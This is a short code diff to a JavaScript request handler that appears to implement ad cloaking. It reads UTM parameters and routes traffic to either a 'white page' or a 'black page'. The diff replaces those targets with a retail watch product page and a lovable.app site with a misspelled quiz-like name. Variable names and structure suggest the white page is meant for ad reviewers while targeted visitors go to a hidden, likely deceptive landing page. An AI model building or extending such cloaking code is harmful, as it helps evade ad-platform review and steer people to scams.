@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://alarminglygood.com/products/black-embroidered-leather-cardholder?pr_prod_strat=e5_desc&pr_rec_id=4fc0f8233&pr_rec_pid=9626571735316&pr_ref_pid=9943760503060&pr_seq=uniform";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://watchfactory.com.au/products/1710448";
+    const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
